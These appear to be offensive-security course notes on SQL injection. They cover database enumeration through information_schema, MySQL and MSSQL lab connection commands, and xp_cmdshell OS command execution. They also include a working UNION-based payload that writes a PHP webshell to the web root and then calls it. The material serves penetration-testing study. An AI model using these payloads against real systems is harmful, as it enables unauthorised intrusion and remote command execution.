# Module 10 : SQL Injection

So the typical SQLi enumeration flow is:

1. Find what databases exist
2. Find what tables are in the target database
3. Find what columns are in the interesting table
4. Extract the actual data

---

## Module 10.1 SQL theory and databases:

---

### MySQL

```bash
#Connection 
kali@kali:~$ mysql -u root -p'<password>' -h <ip> -P 3306 --skip-ssl-verify-server-cert

#Show list for database
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| test               |
+--------------------+
5 rows in set (0.107 sec)
```

- information_schema : database about your database.

```sql
information_schema.tables
information_schema.columns
-- Comment: #  or --
-- List databases: SHOW DATABASES;
```

---


### MSSQL

```bash
#connection
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

#Show database
SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT name FROM sys.databases;
name
...
master

tempdb

model

msdb

offsec

```
### Key differences

```sql
information_schema.tables  -- works in MSSQL too
-- But also has its own:
sys.databases   -- list all databases
sys.tables      -- list tables in current database
sys.columns     -- list columns
-- Comment: --
-- Switch database: USE <dbname>
```

Key differences in MSSQL to remember:
- Comments use `--` not `#`
- String concatenation uses `+` not `CONCAT()`
- Has `xp_cmdshell` — a stored procedure that can **execute OS commands** directly from SQL. 

That's why MSSQL is particularly dangerous — if you get SQLi on MSSQL and `xp_cmdshell` is enabled, you can go straight from SQL injection to OS command execution.

---

## 10.2.2 UNION-based payloads

For UNION SQLi attacks to work, we first need to satisfy two conditions:

1. The injected UNION query has to include the same number of columns as the original query.
2. The data types need to be compatible between each column.


### RCE with MySQL

In MySQL, file privilege allows you to read and write files on the server.

The classic path to RCE is:

**Write a PHP webshell to the web root:**
```sql
mail-list=notexist' UNION SELECT 1,2,3,4,"<?php echo system($_GET['cmd']); ?>",6 INTO OUTFILE '/var/www/html/shell.php'#
```

This writes your PHP webshell directly to the web server's document root.

Then access it at:
```
http://<target_ip>/shell.php?cmd=id
```

Two conditions needed:

1. **MySQL has write permission to the web root** — the MySQL process needs filesystem permission to write to `/var/www/html/`. This isn't always the case — sometimes MySQL runs as a restricted user.

2. **The web server executes PHP** — the file you write needs to be in a location the web server serves AND the server must execute PHP files. If it's nginx without PHP-FPM configured, it won't execute `.php` files.

You already know nginx is running from your earlier enumeration. Nginx doesn't execute PHP natively — it needs PHP-FPM configured alongside it.

---

